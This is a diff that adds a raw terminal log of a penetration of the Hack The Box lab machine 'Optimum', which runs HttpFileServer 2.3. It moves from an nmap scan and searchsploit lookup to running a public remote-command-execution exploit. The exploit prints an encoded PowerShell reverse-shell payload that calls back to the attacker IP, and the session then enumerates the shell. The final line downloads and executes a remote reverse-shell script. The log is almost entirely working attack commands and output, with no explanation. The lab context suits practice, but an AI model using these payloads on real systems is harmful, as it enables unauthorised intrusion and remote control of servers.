@@ -1,0 +1,179 @@
+nmap -T4 -A -p- -Pn -v 10.10.10.8
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 08:14 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:14
+Completed NSE at 08:14, 0.00s elapsed
+Initiating NSE at 08:14
+Completed NSE at 08:14, 0.00s elapsed
+Initiating NSE at 08:14
+Completed NSE at 08:14, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 08:14
+Completed Parallel DNS resolution of 1 host. at 08:14, 0.00s elapsed
+Initiating SYN Stealth Scan at 08:14
+Scanning 10.10.10.8 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.8
+SYN Stealth Scan Timing: About 15.12% done; ETC: 08:18 (0:02:54 remaining)
+SYN Stealth Scan Timing: About 44.18% done; ETC: 08:16 (0:01:17 remaining)
+Completed SYN Stealth Scan at 08:16, 101.59s elapsed (65535 total ports)
+Initiating Service scan at 08:16
+Scanning 1 service on 10.10.10.8
+Completed Service scan at 08:16, 6.17s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 10.10.10.8
+Retrying OS detection (try #2) against 10.10.10.8
+Initiating Traceroute at 08:16
+Completed Traceroute at 08:16, 0.08s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 08:16
+Completed Parallel DNS resolution of 2 hosts. at 08:16, 0.00s elapsed
+NSE: Script scanning 10.10.10.8.
+Initiating NSE at 08:16
+Completed NSE at 08:16, 1.68s elapsed
+Initiating NSE at 08:16
+Completed NSE at 08:16, 0.32s elapsed
+Initiating NSE at 08:16
+Completed NSE at 08:16, 0.00s elapsed
+Nmap scan report for 10.10.10.8
+Host is up (0.072s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.003 days (since Wed May 25 08:11:38 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Optimum_10.10.10.8# searchsploit HFS
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                                          | osx/dos/29454.txt
+Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                                                                    | osx/dos/12375.c
+Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                                                | osx/local/35488.c
+Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                                                         | osx/local/8266.sh
+FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                                                 | windows/remote/37985.py
+HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                | windows/remote/49584.py
+HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                | multiple/remote/48569.py
+Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                                                | linux/dos/28895.txt
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                     | windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                          | windows/remote/31056.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                             | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                        | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                        | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                   | windows/webapps/34852.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Optimum_10.10.10.8# searchsploit -m 49584
+  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
+      URL: https://www.exploit-db.com/exploits/49584
+     Path: /opt/exploitdb/exploits/windows/remote/49584.py
+File Type: ASCII text, with very long lines
+
+Copied to: /root/htb/htb/Optimum_10.10.10.8/49584.py
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Optimum_10.10.10.8# python3 49584.py
+
+Encoded the command in base64 format...
+
+Encoded the payload and sent a HTTP GET request to the target...
+
+Printing some information for debugging...
+lhost:  10.10.14.7
+lport:  1111
+rhost:  10.10.10.8
+rport:  80
+payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwAMQAxADEAMQApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+Listening for connection...
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 10.10.10.8 49162 received!
+whomai
+whoami
+PS C:\Users\kostas\Desktop> optimum\kostas
+PS C:\Users\kostas\Desktop> whoami
+optimum\kostas
+PS C:\Users\kostas\Desktop> systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ??
+System Boot Time:          31/5/2022, 8:09:41 ??
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.393 MB
+Virtual Memory: Max Size:  5.503 MB
+Virtual Memory: Available: 4.808 MB
+Virtual Memory: In Use:    695 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              \\OPTIMUM
+Hotfix(s):                 31 Hotfix(s) Installed.
+                           [01]: KB2959936
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2920189
+                           [05]: KB2928120
+                           [06]: KB2931358
+                           [07]: KB2931366
+                           [08]: KB2933826
+                           [09]: KB2938772
+                           [10]: KB2949621
+                           [11]: KB2954879
+                           [12]: KB2958262
+                           [13]: KB2958263
+                           [14]: KB2961072
+                           [15]: KB2965500
+                           [16]: KB2966407
+                           [17]: KB2967917
+                           [18]: KB2971203
+                           [19]: KB2971850
+                           [20]: KB2973351
+                           [21]: KB2973448
+                           [22]: KB2975061
+                           [23]: KB2976627
+                           [24]: KB2977629
+                           [25]: KB2981580
+                           [26]: KB2987107
+                           [27]: KB2989647
+                           [28]: KB2998527
+                           [29]: KB3000850
+                           [30]: KB3003057
+                           [31]: KB3014442
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+The shell sometimes will be broken...
+
+python3 rce2.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7:8000/mini-reverse.ps1')"
+
+
